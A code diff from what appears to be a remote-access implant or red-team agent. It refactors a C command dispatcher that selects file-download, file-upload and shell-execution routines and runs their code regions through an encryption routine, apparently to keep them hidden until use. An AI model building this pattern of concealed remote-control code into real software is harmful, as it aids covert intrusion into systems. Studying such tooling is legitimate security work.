@@ -50,32 +50,26 @@ buffer run_command(result *res, uint64_t command_id, const char *key, const char
     unsigned char **start_address;
     unsigned char **end_address;
 
-    switch (command_id) {
-        case GET_FILE_COMMAND_ID:
-            chosen_command = get_file;
-            extern unsigned char *__get_file_start;
-            extern unsigned char *__get_file_end;
-            start_address = &__get_file_start;
-            end_address = &__get_file_end;
-            break;
-
-        case PUT_FILE_COMMAND_ID:
-            chosen_command = put_file;
-            extern unsigned char *__put_file_start;
-            extern unsigned char *__put_file_end;
-            start_address = &__put_file_start;
-            end_address = &__put_file_end;
-            break;
-
-        case RUN_SHELL_COMMAND_ID:
-            chosen_command = run_shell;
-            extern unsigned char *__run_shell_start;
-            extern unsigned char *__run_shell_end;
-            start_address = &__run_shell_start;
-            end_address = &__run_shell_end;
-            break;
-
-        default: HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: %llx", command_id)
+    if (command_id == GET_FILE_COMMAND_ID) {
+        chosen_command = get_file;
+        extern unsigned char *__get_file_start;
+        extern unsigned char *__get_file_end;
+        start_address = &__get_file_start;
+        end_address = &__get_file_end;
+    } else if (command_id == PUT_FILE_COMMAND_ID) {
+        chosen_command = put_file;
+        extern unsigned char *__put_file_start;
+        extern unsigned char *__put_file_end;
+        start_address = &__put_file_start;
+        end_address = &__put_file_end;
+    } else if (command_id == RUN_SHELL_COMMAND_ID) {
+        chosen_command = run_shell;
+        extern unsigned char *__run_shell_start;
+        extern unsigned char *__run_shell_end;
+        start_address = &__run_shell_start;
+        end_address = &__run_shell_end;
+    } else {
+        HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: %llx", command_id)
     }
 
     *res = xcrypt_command(key, iv, (const unsigned char *) start_address, (const unsigned char *) end_address);
